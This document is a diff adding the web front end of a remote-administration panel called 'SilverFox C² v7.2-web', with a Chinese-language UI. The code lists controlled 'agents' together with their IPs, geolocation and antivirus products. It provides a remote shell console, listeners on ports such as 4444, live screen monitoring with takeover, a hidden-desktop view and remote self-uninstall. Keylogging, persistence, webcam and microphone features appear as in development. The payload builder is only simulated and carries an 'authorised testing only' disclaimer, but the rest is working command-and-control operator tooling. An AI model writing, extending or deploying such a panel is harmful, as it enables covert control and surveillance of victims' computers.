+          <button class="log-fbtn" data-filter="offline" onclick="setLogFilter('offline',this)">下线</button>
+          <button class="log-fbtn" data-filter="cmd" onclick="setLogFilter('cmd',this)">命令</button>
+          <button class="log-fbtn" data-filter="cmd_result" onclick="setLogFilter('cmd_result',this)">结果</button>
+          <button class="log-fbtn" data-filter="listener" onclick="setLogFilter('listener',this)">监听器</button>
+        </div>
+        <div class="log-actions">
+          <button class="btn sm" onclick="clearLogs()">清空</button>
+          <label class="log-autoscroll"><input type="checkbox" id="logAutoscroll" checked> 自动滚动</label>
+        </div>
+      </div>
+      <div class="log-viewer" id="logViewer">
+        <div class="log-entry sys"><span class="log-ts">--:--:--</span><span class="log-cat">[系统]</span> 日志页面就绪，等待服务器事件...</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- COMMAND PANEL -->
+<div id="cmd-panel">
+  <div class="cp-header">
+    <span>▸ 命令控制台 [<span id="cpAgent">-</span>]</span>
+    <button onclick="closeCmdPanel()">✕</button>
+  </div>
+  <div class="cp-body" id="cpBody"></div>
+  <div class="cp-input-row">
+    <span class="cp-prompt" id="cpPrompt">sf ></span>
+    <input type="text" id="cpInput" placeholder="输入命令，回车发送..." onkeydown="cmdKeyDown(event)">
+    <button onclick="sendCmd()" id="cpBtn" disabled>执行</button>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<div id="footer">
+  <div class="f-left"><span class="f-dot"></span>监听成功</div>
+  <div class="f-right">连接数: <span id="fConn">0</span> | SilverFox C² v7.2-web</div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<div class="modal-overlay" id="detailModal" onclick="this.classList.remove('show')">
+  <div class="modal-box" onclick="event.stopPropagation()">
+    <button class="modal-close" onclick="document.getElementById('detailModal').classList.remove('show')">&times;</button>
+    <h3>Agent 详细信息</h3>
+    <div id="detailContent"></div>
+  </div>
+</div>
+
+<!-- FEATURE CONFIG MODAL -->
+<div class="modal-overlay" id="featModal" onclick="closeFeatConfig()">
+  <div class="modal-box" onclick="event.stopPropagation()" style="width:520px">
+    <button class="modal-close" onclick="closeFeatConfig()">&times;</button>
+    <h3>功能按钮配置</h3>
+    <div class="feat-list" id="featList"></div>
+    <div id="feat-add-row">
+      <input type="text" id="featNewName" placeholder="功能名称" maxlength="16">
+      <select id="featNewStatus">
+        <option value="done" selected>已实现</option>
+        <option value="wip">开发中</option>
+      </select>
+      <button class="btn accent sm" onclick="addFeatItem()">添加</button>
+      <button class="btn accent sm" onclick="resetFeatDefault()" style="margin-left:auto">恢复默认</button>
+    </div>
+    <div style="margin-top:12px;display:flex;justify-content:flex-end;gap:6px">
+      <button class="btn" onclick="closeFeatConfig()">取消</button>
+      <button class="btn accent" onclick="saveFeatConfig()">保存</button>
+    </div>
+  </div>
+</div>
+
+<!-- SCREENSHOT OVERLAY -->
+<div id="screenshot-overlay" onclick="this.classList.remove('show')">
+  <div class="ss-bar">
+    <button onclick="event.stopPropagation();document.getElementById('screenshot-overlay').classList.remove('show')">关闭 ESC</button>
+    <button onclick="event.stopPropagation();saveScreenshot()">保存</button>
+  </div>
+  <div id="ssContent" style="display:flex;flex-direction:column;align-items:center;gap:8px"></div>
+  <div class="ss-info" id="ssInfo"></div>
+</div>
+
+<!-- MONITOR OVERLAY -->
+<div id="monitor-overlay">
+  <div class="mo-top">
+    <span class="mo-title" id="moTitle">屏幕监控 — 未连接</span>
+    <div class="mo-stats">
+      <span>帧: <b id="moFrame">0</b></span>
+      <span>流量: <b id="moTraffic">0</b> KB</span>
+      <span>用时: <b id="moElapsed">00:00</b></span>
+      <span class="mo-live" id="moLiveDot" style="display:none">● LIVE</span>
+    </div>
+    <div class="mo-ctrl">
+      <select id="moInterval" onchange="changeInterval()">
+        <option value="200">200ms</option>
+        <option value="500" selected>500ms</option>
+        <option value="1000">1s</option>
+        <option value="2000">2s</option>
+        <option value="3000">3s</option>
+        <option value="5000">5s</option>
+      </select>
+      <button class="btn accent sm" id="moBtn" onclick="toggleMonitoring()">开始</button>
+      <button class="btn sm" onclick="saveMonitorFrame()">保存帧</button>
+      <button class="btn sm" id="moCtrlBtn" onclick="toggleControl()">控制屏幕</button>
+      <button class="btn muted sm" onclick="closeMonitor()">关闭</button>
+    </div>
+  </div>
+  <div class="mo-body" id="moBody">
+    <canvas id="moCanvas" style="display:none"></canvas>
+    <div class="mo-placeholder" id="moPlaceholder">
+      <div class="mo-icon">▣</div>
+      <div>选择上线 Agent 后点击「开始」启动实时屏幕监控</div>
+    </div>
+  </div>
+  <div class="mo-footer">
+    <span id="moAgentId"></span>
+    <span id="moLastUpdate"></span>
+    <span id="moCtrlHint" style="display:none;color:var(--accent)"></span>
+  </div>
+</div>
+
+<!-- HVNC OVERLAY -->
+<div id="hvnc-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:302;flex-direction:column">
+  <div class="mo-top">
+    <span class="mo-title" id="hvncTitle">后台屏幕 — 未连接</span>
+    <div class="mo-ctrl">
+      <button class="btn accent sm" id="hvncBtn" onclick="toggleHvncSession()">创建桌面</button>
+      <button class="btn sm" onclick="hvncRefresh()">刷新画面</button>
+      <button class="btn muted sm" onclick="closeHvnc()">关闭</button>
+    </div>
+  </div>
+  <div class="mo-body" id="hvncBody">
+    <canvas id="hvncCanvas" style="display:none;max-width:98vw;max-height:calc(100vh-44px);border:1px solid var(--border);border-radius:2px"></canvas>
+    <div class="mo-placeholder" id="hvncPlaceholder">
+      <div class="mo-icon">▣</div>
+      <div>选择上线 Agent 后点击「创建桌面」启动后台屏幕</div>
+    </div>
+  </div>
+  <div class="mo-footer">
+    <span id="hvncAgentId"></span>
+    <span id="hvncStatus"></span>
+  </div>
+</div>
+
+<script>
+// ===== STATE =====
+let agents=[],allAgents=[],selectedId=null,ws=null;
+let cmdHistories={};
+let cmdInputHistories={};
+let cmdHistoryIndex=-1;
+let offlineCount=0,todayCount=0,totalManaged=0;
+let listeners=[];
+let logEntries=[],logFilter='all';
+let monitoringActive=false,monitoringTimer=null,monitoringAgentId=null;
+let ssLastB64=null,moLastB64=null;
+let moFrameCount=0,moTrafficKB=0,moStartTime=null;
+const MAX_LOG_ENTRIES=500;
+
+// ===== AUTH =====
+let sfToken=localStorage.getItem('sf_token')||'';
+async function apiFetch(url,opts={}){
+  if(!sfToken){location.href='/login.html';throw new Error('not authenticated');}
+  const headers={...opts.headers||{},'Authorization':'Bearer '+sfToken};
+  const r=await fetch(url,{...opts,headers});
+  if(r.status===401){sfToken='';localStorage.removeItem('sf_token');location.href='/login.html';throw new Error('session expired');}
+  return r;
+}
+
+// ===== LOG =====
+function appendLog(cat,msg){
+  const now=Date.now();
+  logEntries.push({cat,msg,ts:now});
+  if(logEntries.length>MAX_LOG_ENTRIES)logEntries.shift();
+  try{localStorage.setItem('sf_logs',JSON.stringify(logEntries));}catch(e){}
+  if(logFilter!=='all'&&logFilter!==cat)return;
+  const viewer=document.getElementById('logViewer');
+  const entry=document.createElement('div');
+  entry.className=`log-entry ${cat}`;
+  entry.dataset.cat=cat;
+  entry.innerHTML=`<span class="log-ts">${fmtLogTime(now)}</span><span class="log-cat">[${cat.toUpperCase()}]</span><span class="log-msg">${esc(msg)}</span>`;
+  viewer.appendChild(entry);
+  if(document.getElementById('logAutoscroll').checked)viewer.scrollTop=viewer.scrollHeight;
+  while(viewer.children.length>MAX_LOG_ENTRIES)viewer.removeChild(viewer.firstChild);
+}
+function setLogFilter(filter,btn){
+  logFilter=filter;
+  document.querySelectorAll('.log-fbtn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  const viewer=document.getElementById('logViewer');
+  viewer.innerHTML='';
+  const filtered=filter==='all'?logEntries:logEntries.filter(e=>e.cat===filter);
+  filtered.forEach(e=>{
+    const entry=document.createElement('div');
+    entry.className=`log-entry ${e.cat}`;
+    entry.dataset.cat=e.cat;
+    entry.innerHTML=`<span class="log-ts">${fmtLogTime(e.ts)}</span><span class="log-cat">[${e.cat.toUpperCase()}]</span><span class="log-msg">${esc(e.msg)}</span>`;
+    viewer.appendChild(entry);
+  });
+  viewer.scrollTop=viewer.scrollHeight;
+}
+function clearLogs(){
+  logEntries=[];
+  document.getElementById('logViewer').innerHTML='<div class="log-entry sys"><span class="log-ts">--:--:--</span><span class="log-cat">[系统]</span> 日志已清空</div>';
+}
+function fmtLogTime(ts){
+  const d=new Date(ts);
+  return d.toTimeString().slice(0,8)+'.'+String(d.getMilliseconds()).padStart(3,'0');
+}
+
+// ===== WEBSOCKET =====
+function connectWS(){
+  if(!sfToken){setTimeout(connectWS,1000);return;}
+  const p=location.protocol==='https:'?'wss:':'ws:';
+  ws=new WebSocket(`${p}//${location.host}/ws/panel?token=${encodeURIComponent(sfToken)}`);
+  ws.onopen=()=>appendLog('sys','WebSocket 已连接');
+  ws.onclose=()=>setTimeout(connectWS,3000);
+  ws.onmessage=ev=>{try{handleMsg(JSON.parse(ev.data))}catch(e){}};
+}
+function handleMsg(m){
+  switch(m.type){
+    case 'agent_list':allAgents=m.data||[];filterAgents();break;
+    case 'event':
+      if(m.event==='agent_online'){appendLog('sys',`[+] ${m.data?.hostname||m.agent_id} 上线`);totalManaged++;todayCount++;saveAgentCache()}
+      else if(m.event==='agent_offline'){appendLog('sys',`[-] ${m.agent_id} 下线`);offlineCount++;if(selectedId===m.agent_id){selectedId=null;updateCmdPanel();}saveAgentCache()}
+      else if(m.event==='cmd_result'){
+        const data=m.data?.data||'(空)';
+        const isSel=m.agent_id===selectedId;
+        if(typeof data==='string'&&data.startsWith('SCREENSHOT:')){
+          const b64=data.slice(11);
+          if(b64==='SAME'){
+            if(monitoringActive && m.agent_id===monitoringAgentId) handleMonitorSame();
+            else (isSel?logCmd:appendCmdHistory.bind(null,m.agent_id))('out',`[${m.agent_id}] 屏幕未变化`);
+          }else{
+            if(monitoringActive && m.agent_id===monitoringAgentId){
+              updateMonitorFrame(b64,m.agent_id);
+            }else{
+              showScreenshot(b64,m.agent_id);
+              (isSel?logCmd:appendCmdHistory.bind(null,m.agent_id))('out',`[${m.agent_id}] 屏幕截图已接收 (${Math.round(b64.length/1024)} KB)`);
+            }
+          }
+        }else if(typeof data==='string'&&data.startsWith('UNINSTALL:')){
+          toast(`${m.agent_id} 已下线并自卸载`,'ok');
+          (isSel?logCmd:appendCmdHistory.bind(null,m.agent_id))('out',`[${m.agent_id}] 卸载完成`);
+          if(selectedId===m.agent_id){selectedId=null;updateCmdPanel();}
+        }else{
+          (isSel?logCmd:appendCmdHistory.bind(null,m.agent_id))('out',`[${m.agent_id}] ${data}`);
+        }
+      }
+      refreshAgents();break;
+    case 'log':appendLog(m.category,m.message);break;
+  }
+}
+
+// ===== RENDER =====
+function renderAll(){renderSidebar();renderTable();updateCounts();}
+function renderSidebar(){
+  const list=document.getElementById('sList'),empty=document.getElementById('sEmpty');
+  const q=document.getElementById('sSearch').value.trim();
+  list.querySelectorAll('.s-agent').forEach(e=>e.remove());
+  if(agents.length===0){
+    empty.style.display='block';
+    empty.innerHTML=q?'<div class="icon">⚲</div>无匹配结果':'<div class="icon">▢</div>等待客户端连接...';
+  }else{
+    empty.style.display='none';
+    agents.forEach(a=>{
+      const div=document.createElement('div');
+      div.className=`s-agent${selectedId===a.id?' sel':''}`;
+      div.innerHTML=`<div class="sa-top"><span class="sa-id">${esc(a.id)}</span><span class="sa-dot"></span></div><div class="sa-info">${esc(a.hostname||'?')} · ${esc(a.external_ip||a.remote_ip||'')}</div><div class="sa-info" style="color:var(--accent-dim);font-size:9px">${shortAV(a.av)} · ${shortGeo(a.geo)}</div>`;
+      div.onclick=()=>selectAgent(a.id);list.appendChild(div);
+    });
+  }
+  document.getElementById('sBadge').textContent=agents.length;
+}
+function renderTable(){
+  const tb=document.getElementById('tBody'),q=document.getElementById('sSearch').value.trim();
+  if(agents.length===0){tb.innerHTML=`<tr class="empty-row"><td colspan="12">${q?'无匹配结果':'暂无数据'}</td></tr>`;return}
+  tb.innerHTML=agents.map(a=>`
+    <tr class="${selectedId===a.id?'sel':''}" onclick="selectAgent('${esc(a.id)}')">
+      <td><span class="dot on"></span></td>
+      <td><span style="color:var(--accent);font-family:var(--mono);font-size:10px;font-weight:600">${esc(a.id)}</span></td>
+      <td>${esc(a.hostname||'-')}</td><td>${esc(a.os||'-')}</td>
+      <td>${esc(a.remote_ip||'-')}</td>
+      <td>${esc(a.external_ip||'-')}</td>
+      <td title="${esc(a.geo||'')}" class="geo-col">${shortGeo(a.geo)}</td>
+      <td title="${esc(a.av||'')}" class="av-col">${shortAV(a.av)}</td>
+      <td>${fmtTime(a.online_at)}</td><td>${fmtTime(Math.floor(Date.now()/1000))}</td><td>-</td>
+      <td><button class="btn accent sm" onclick="event.stopPropagation();if(selectedId!=='${esc(a.id)}'){selectedId='${esc(a.id)}';renderAll();updateCmdPanel()};openCmdPanel()">交互</button><button class="btn sm muted" onclick="event.stopPropagation();showAgentDetail('${esc(a.id)}')">详细</button><button class="btn sm muted" onclick="event.stopPropagation();requestScreenshot('${esc(a.id)}')" title="屏幕截图">截图</button><button class="btn sm muted" onclick="event.stopPropagation();uninstallAgent('${esc(a.id)}')" title="卸载下线">卸载</button></td>
+    </tr>`).join('');
+}
+function updateCounts(){
+  document.getElementById('scOnline').textContent=agents.length;
+  document.getElementById('scOffline').textContent=offlineCount;
+  document.getElementById('scToday').textContent=todayCount;
+  document.getElementById('scTotal').textContent=totalManaged;
+  document.getElementById('fConn').textContent=agents.length;
+  document.getElementById('sBadge').textContent=agents.length;
+}
+
+// ===== AGENT =====
+function selectAgent(id){
+  if(selectedId){
+    cmdHistories[selectedId]=document.getElementById('cpBody').innerHTML;
+  }
+  selectedId=selectedId===id?null:id;
+  renderAll();updateCmdPanel();
+  if(!selectedId) closeCmdPanel();
+  else loadCmdHistory(selectedId);
+}
+function loadCmdHistory(id){
+  document.getElementById('cpBody').innerHTML=cmdHistories[id]||'';
+  cmdInputHistories[id]=cmdInputHistories[id]||[];
+  cmdHistoryIndex=-1;
+  document.getElementById('cpInput').value='';
+}
+function appendCmdHistory(agentId,type,text){
+  const line=`<div class="log-line ${type}"><span class="lt">${now()}</span>${esc(text)}</div>`;
+  cmdHistories[agentId]=(cmdHistories[agentId]||'')+line;
+  if(agentId===selectedId){
+    document.getElementById('cpBody').innerHTML+=line;
+    document.getElementById('cpBody').scrollTop=document.getElementById('cpBody').scrollHeight;
+  }
+}
+function filterAgents(){
+  const q=document.getElementById('sSearch').value.toLowerCase();
+  const btn=document.getElementById('sClearBtn');
+  if(q){
+    agents=allAgents.filter(a=>(a.id+a.hostname+a.remote_ip+a.external_ip+a.os+a.av+a.geo).toLowerCase().includes(q));
+    btn.style.display='block';
+  }else{
+    agents=allAgents;
+    btn.style.display='none';
+  }
+  renderAll();
+}
+function clearSearch(){
+  document.getElementById('sSearch').value='';
+  document.getElementById('sClearBtn').style.display='none';
+  agents=allAgents;
+  renderAll();
+  document.getElementById('sSearch').focus();
+}
+
+// ===== CMD PANEL =====
+function openCmdPanel(){document.getElementById('cmd-panel').classList.add('open');updateCmdPanel();document.getElementById('cpInput').focus()}
+function closeCmdPanel(){document.getElementById('cmd-panel').classList.remove('open')}
+function updateCmdPanel(){
+  document.getElementById('cpAgent').textContent=selectedId||'-';
+  document.getElementById('cpPrompt').textContent=selectedId?`sf (${selectedId.slice(0,10)}) >`:'sf >';
+  document.getElementById('cpBtn').disabled=!selectedId;
+}
+function cmdKeyDown(e){
+  if(e.key==='Enter'){sendCmd();return}
+  if(!selectedId)return;
+  const hist=cmdInputHistories[selectedId]||[];
+  if(hist.length===0)return;
+  if(e.key==='ArrowUp'){
+    e.preventDefault();
+    if(cmdHistoryIndex===-1){
+      cmdHistoryIndex=hist.length-1;
+    }else if(cmdHistoryIndex>0){
+      cmdHistoryIndex--;
+    }
+    document.getElementById('cpInput').value=hist[cmdHistoryIndex];
+  }else if(e.key==='ArrowDown'){
+    e.preventDefault();
+    if(cmdHistoryIndex===-1)return;
+    if(cmdHistoryIndex<hist.length-1){
+      cmdHistoryIndex++;
+      document.getElementById('cpInput').value=hist[cmdHistoryIndex];
+    }else{
+      cmdHistoryIndex=-1;
+      document.getElementById('cpInput').value='';
+    }
+  }
+}
+async function sendCmd(){
+  const input=document.getElementById('cpInput'),cmd=input.value.trim();
+  if(!cmd||!selectedId)return;
+  cmdInputHistories[selectedId]=cmdInputHistories[selectedId]||[];
+  cmdInputHistories[selectedId].push(cmd);
+  cmdHistoryIndex=-1;
+  input.value='';
+  logCmd('cmd',`sf > ${cmd}`);
+  try{
+    const r=await apiFetch('/api/cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:selectedId,cmd})});
+    const d=await r.json();
+    if(!r.ok)logCmd('err',`[!] ${d.error}`);
+  }catch(e){logCmd('err',`[!] ${e.message}`)}
+}
+function logCmd(type,text){
+  const el=document.getElementById('cpBody');
+  const div=document.createElement('div');
+  div.className=`log-line ${type}`;
+  div.innerHTML=`<span class="lt">${now()}</span>${esc(text)}`;
+  el.appendChild(div);el.scrollTop=el.scrollHeight;
+  while(el.children.length>300)el.removeChild(el.firstChild);
+}
+
+// ===== LISTENER =====
+async function loadListeners(){
+  try{
+    const r=await apiFetch('/api/listeners');
+    if(r.ok){listeners=await r.json();renderListeners()}
+  }catch(e){}
+}
+function renderListeners(){
+  const el=document.getElementById('listenerList');
+  const badge=document.getElementById('lnBadge');
+  const tl=document.getElementById('tListener');
+  const running=listeners.filter(l=>l.status==='running').length;
+  if(badge){badge.textContent=running;badge.className=running?'s-nav-badge':'s-nav-badge zero'}
+  if(tl){
+    if(running>0){
+      tl.innerHTML='<span class="dot on"></span>监听器 <b>'+running+'</b> 运行中';
+    }else{
+      tl.innerHTML='<span class="dot off"></span>监听器 — 暂无';
+    }
+  }
+  if(listeners.length===0){
+    el.innerHTML='<div class="s-empty"><div class="icon">⏱</div>暂无活跃监听器<br><span style="font-size:10px;color:var(--gray-dark);margin-top:4px;display:inline-block">在上方创建监听器以接收 Agent 连接</span></div>';
+    return
+  }
+  el.innerHTML=listeners.map(l=>`
+    <div class="listener-item">
+      <div class="li-info">
+        <span class="dot ${l.status==='running'?'on':'off'}"></span>
+        <div><span class="li-name">${esc(l.name)}</span><br><span class="li-detail">${(l.proto||'').toUpperCase()}://${l.addr}:${l.port} — ${l.status==='running'?'运行中':'已停止'}${l.started?` (${fmtRel(l.started*1000||l.started)})`:''}</span></div>
+      </div>
+      <div class="li-actions">
+        ${l.status==='running'?`<button class="btn danger sm" onclick="toggleListener('${l.id}')">停止</button>`:`<button class="btn accent sm" onclick="toggleListener('${l.id}')">启动</button>`}
+        <button class="btn sm" onclick="removeListener('${l.id}')">删除</button>
+      </div>
+    </div>`).join('');
+}
+async function addListener(){
+  const name=document.getElementById('lName').value.trim()||'Listener';
+  const proto=document.getElementById('lProto').value;
+  const addr=document.getElementById('lAddr').value.trim()||'0.0.0.0';
+  const port=parseInt(document.getElementById('lPort').value)||4444;
+  try{
+    const r=await apiFetch('/api/listeners',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,proto,addr,port})});
+    const d=await r.json();
+    if(!r.ok){toast(d.error||'创建失败','err');return}
+    addListenerLog(`[+] 监听器 "${name}" 已启动 — ${proto.toUpperCase()}://${addr}:${port}`);
+    toast('监听器已启动','ok');
+    await loadListeners();
+  }catch(e){toast('请求失败: '+e.message,'err')}
+}
+async function toggleListener(id){
+  try{
+    const r=await apiFetch(`/api/listeners/${id}/toggle`,{method:'POST'});
+    const d=await r.json();
+    if(!r.ok){toast(d.error||'操作失败','err');return}
+    addListenerLog(`[${d.status==='started'?'+':'-'}] 监听器状态: ${d.status}`);
+    toast(d.status==='started'?'已启动':'已停止','ok');
+    await loadListeners();
+  }catch(e){toast('请求失败: '+e.message,'err')}
+}
+async function removeListener(id){
+  try{
+    const r=await apiFetch(`/api/listeners/${id}`,{method:'DELETE'});
+    const d=await r.json();
+    if(!r.ok){toast(d.error||'删除失败','err');return}
+    addListenerLog(`[-] 监听器已移除`);
+    toast('监听器已删除','ok');
+    await loadListeners();
+  }catch(e){toast('请求失败: '+e.message,'err')}
+}
+function addListenerLog(msg){
+  const el=document.getElementById('listenerLogs');
+  el.innerHTML+=`<div style="margin-bottom:2px">[${now()}] ${esc(msg)}</div>`;
+  el.scrollTop=el.scrollHeight;
+}
+
+// ===== GENERATOR =====
+function genPayload(){
+  const os=document.getElementById('gOS').value,fmt=document.getElementById('gFormat').value;
+  const proto=document.getElementById('gProto').value,host=document.getElementById('gHost').value.trim()||'127.0.0.1';
+  const port=parseInt(document.getElementById('gPort').value)||443;
+  const sleep=parseInt(document.getElementById('gSleep').value)||5;
+  const jitter=parseInt(document.getElementById('gJitter').value)||0;
+  const crypto=document.getElementById('gCrypto').value;
+  const kex=document.getElementById('gKex').value;
+  const ua=document.getElementById('gUA').value;
+  const retry=parseInt(document.getElementById('gRetry').value)||10;
+  const delay=parseInt(document.getElementById('gDelay').value)||0;
+  const exit=document.getElementById('gExit').value;
+
+  const url=`${proto}://${host}:${port}/ws/agent`;
+  const ts=new Date().toISOString().replace(/[:\-T.]/g,'').slice(0,14);
+
+  const preview=`┌─ SilverFox C² Payload ─────────────────────────────
+│ Build:   ${ts}
+│ Target:  ${os} / ${fmt}
+│ C2:      ${url}
+│ Crypto:  ${crypto}  |  KEX:  ${kex}
+│ Sleep:   ${sleep}s (±${jitter}%)  |  Initial Delay: ${delay}s
+│ Retry:   max ${retry}  |  Exit:  ${exit}
+│ UA:      ${ua.slice(0,60)}${ua.length>60?'...':''}
+├──────────────────────────────────────────────────
+│ [模拟] 正在编译...
+│ [模拟] ${fmt==='shellcode'?`shellcode 已生成 (预估 ${Math.floor(300+Math.random()*200)} 字节)`:`${fmt.toUpperCase()} 已生成 (预估 ${Math.floor(80+Math.random()*40)} KB)`}
+│ [模拟] 签名: ${Array.from({length:32},()=>'0123456789abcdef'[Math.floor(Math.random()*16)]).join('')}
+│
+│ ⚠ 此 Payload 仅供授权测试使用
+└──────────────────────────────────────────────────`;
+
+  document.getElementById('genPreview').textContent=preview;
+  toast('Payload 生成完毕','ok');
+}
+
+// ===== NAVIGATION =====
+function navTo(page){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.s-nav-item').forEach(n=>n.classList.remove('active'));
+  document.querySelectorAll('.tb-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById(`page-${page}`).classList.add('active');
+  document.querySelector(`.s-nav-item[data-page="${page}"]`)?.classList.add('active');
+  document.querySelector(`.tb-btn[data-page="${page}"]`)?.classList.add('active');
+  if(page==='listeners')renderListeners();
+}
+document.querySelectorAll('.tb-btn').forEach(b=>b.addEventListener('click',()=>navTo(b.dataset.page)));
+document.querySelectorAll('.s-nav-item[data-page]').forEach(i=>i.addEventListener('click',()=>navTo(i.dataset.page)));
+
+// ===== UTILS =====
+function saveAgentCache(){
+  try{localStorage.setItem('sf_agent_cache',JSON.stringify({allAgents,totalManaged,todayCount,offlineCount}))}catch(e){}
+}
+function loadAgentCache(){
+  try{
+    const c=JSON.parse(localStorage.getItem('sf_agent_cache'));
+    if(c){
+      allAgents=c.allAgents||[];
+      totalManaged=c.totalManaged||0;
+      todayCount=c.todayCount||0;
+      offlineCount=c.offlineCount||0;
+      filterAgents();
+    }
+  }catch(e){}
+}
+function refreshAgents(){return apiFetch('/api/agents').then(r=>r.json()).then(d=>{allAgents=d;filterAgents();saveAgentCache()}).catch(()=>{})}
+async function doRefresh(){await refreshAgents();navTo('dashboard');}
+function toast(m,t='info'){
+  const el=document.getElementById('toast');el.textContent=m;el.className=`toast ${t} show`;
+  setTimeout(()=>el.classList.remove('show'),2500);
+}
+function now(){return new Date().toTimeString().slice(0,8)}
+function fmtTime(ts){return ts?new Date(ts*1000).toLocaleString():'-'}
+function fmtRel(ts){const s=Math.floor((Date.now()-ts)/1000);if(s<60)return`${s}秒`;if(s<3600)return`${Math.floor(s/60)}分钟`;return`${Math.floor(s/3600)}小时`}
+function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+function shortGeo(g){
+  if(!g||g==='-')return'-';
+  const parts=g.split(',');
+  const last=parts[parts.length-1].trim();
+  return last.length>6?last.slice(0,6)+'…':last;
+}
+function shortAV(av){
+  if(!av||av==='-')return'-';
+  const lines=av.split('\n').filter(l=>l.trim());
+  if(lines.length===0)return'-';
+  if(lines.length===1)return lines[0].length>14?lines[0].slice(0,14)+'…':lines[0];
+  return lines[0].length>14?lines[0].slice(0,14)+'… '+`+${lines.length-1}`:lines[0]+` +${lines.length-1}`;
+}
+function showAgentDetail(id){
+  const a=allAgents.find(x=>x.id===id);if(!a)return;
+  document.getElementById('detailContent').innerHTML=`
+    <div class="info-row"><span class="lbl">Agent ID</span><span class="val" style="font-family:var(--mono)">${esc(a.id)}</span></div>
+    <div class="info-row"><span class="lbl">主机名</span><span class="val">${esc(a.hostname||'-')}</span></div>
+    <div class="info-row"><span class="lbl">操作系统</span><span class="val">${esc(a.os||'-')}</span></div>
+    <div class="info-row"><span class="lbl">用户</span><span class="val">${esc(a.username||'-')}</span></div>
+    <div class="info-row"><span class="lbl">内网 IP</span><span class="val">${esc(a.remote_ip||'-')}</span></div>
+    <div class="info-row"><span class="lbl">外网 IP</span><span class="val">${esc(a.external_ip||'-')}</span></div>
+    <div class="info-row"><span class="lbl">地理位置</span><span class="val">${esc(a.geo||'-')}</span></div>
+    <div class="info-row"><span class="lbl">杀软</span><span class="val" style="white-space:pre-wrap;text-align:right">${esc(a.av||'-')}</span></div>
+    <div class="info-row"><span class="lbl">上线时间</span><span class="val">${fmtTime(a.online_at)}</span></div>
+  `;
+  document.getElementById('detailModal').classList.add('show');
+}
+
+async function requestScreenshot(id){
+  toast('正在请求屏幕截图...','info');
+  try{
+    const r=await apiFetch('/api/screenshot',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:id})});
+    const d=await r.json();
+    if(!r.ok){toast(d.error||'请求失败','err');return}
+    logCmd('cmd',`sf > screenshot (${id})`);
+  }catch(e){toast('请求失败: '+e.message,'err')}
+}
+
+async function uninstallAgent(id){
+  toast(`正在向 ${id} 发送卸载指令...`,'info');
+  try{
+    const r=await apiFetch('/api/uninstall',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:id})});
+    const d=await r.json();
+    if(!r.ok){toast(d.error||'请求失败','err');return}
+    logCmd('cmd',`sf > uninstall (${id})`);
+  }catch(e){toast('请求失败: '+e.message,'err')}
+}
+
+function showScreenshot(b64,agentId){
+  const overlay=document.getElementById('screenshot-overlay');
+  const content=document.getElementById('ssContent');
+  const info=document.getElementById('ssInfo');
+  const ts=new Date().toLocaleString();
+
+  content.innerHTML=`<img src="data:image/jpeg;base64,${b64}" alt="Screenshot" onclick="event.stopPropagation()">`;
+  ssLastB64=b64;
+  info.textContent=`${agentId} · ${ts}`;
+  overlay.classList.add('show');
+}
+
+function saveScreenshot(){
+  const img=document.querySelector('#screenshot-overlay img');
+  if(!img||!ssLastB64)return;
+  const a=document.createElement('a');
+  a.href=img.src;
+  a.download=`screenshot_${new Date().toISOString().replace(/[:.]/g,'-').slice(0,19)}.png`;
+  a.click();
+}
+
+// ===== FEATURE BAR =====
+const DEFAULT_FEATURES=[
+  {name:'卸载下线',status:'done',action:'uninstall'},
+  {name:'文件管理',status:'done'},
+  {name:'远程Shell',status:'done',action:'shell'},
+  {name:'进程管理',status:'done'},
+  {name:'系统信息',status:'done',action:'detail'},
+  {name:'代理',status:'done'},
+  {name:'注册表',status:'done'},
+  {name:'键盘记录',status:'wip'},
+  {name:'持久化',status:'wip'},
+  {name:'摄像头',status:'wip'},
+  {name:'麦克风',status:'wip'},
+  {name:'录屏',status:'wip'},
+  {name:'屏幕监控',status:'done',action:'monitor'},
+  {name:'后台屏幕',status:'wip',action:'hvnc'},
+  {name:'屏幕捕获',status:'done',action:'screenshot'}
+];
+let features=[],featEditing=[];
+
+function loadFeatures(){
+  try{
+    const raw=localStorage.getItem('sf_features');
+    if(raw){features=JSON.parse(raw);return}
+  }catch(e){}
+  features=DEFAULT_FEATURES.map(f=>({...f}));
+}
+function saveFeatures(){try{localStorage.setItem('sf_features',JSON.stringify(features))}catch(e){}}
+function renderFeatureBar(){
+  const bar=document.getElementById('feature-bar');
+  bar.querySelectorAll('.feat-item').forEach(e=>e.remove());
+  const cfgBtn=document.getElementById('feat-config-btn');
+  features.forEach((f,i)=>{
+    const el=document.createElement('span');
+    el.className=`feat-item ${f.status}`;
+    el.onclick=()=>featClick(f);
+    el.innerHTML=`<span class="fi-dot"></span>${esc(f.name)}`;
+    cfgBtn.before(el);
+  });
+}
+function featClick(f){
+  if(!f.action){toast('「'+f.name+'」功能开发中','info');return;}
+  switch(f.action){
+    case 'uninstall':if(!selectedId){toast('请先选择 Agent','warn');return}uninstallAgent(selectedId);break;
+    case 'shell':if(!selectedId){toast('请先选择 Agent','warn');return}openCmdPanel();break;
+    case 'detail':if(!selectedId){toast('请先选择 Agent','warn');return}showAgentDetail(selectedId);break;
+    case 'monitor':if(!selectedId){toast('请先选择 Agent','warn');return}openMonitor();break;
+    case 'hvnc':if(!selectedId){toast('请先选择 Agent','warn');return}openHvnc();break;
+    case 'screenshot':if(!selectedId){toast('请先选择 Agent','warn');return}requestScreenshot(selectedId);break;
+    default:toast('「'+f.name+'」功能开发中','info');break;
+  }
+}
+
+// ===== FEAT CONFIG MODAL =====
+function openFeatConfig(){
+  featEditing=features.map(f=>({...f}));
+  renderFeatList();
+  document.getElementById('featModal').classList.add('show');
+}
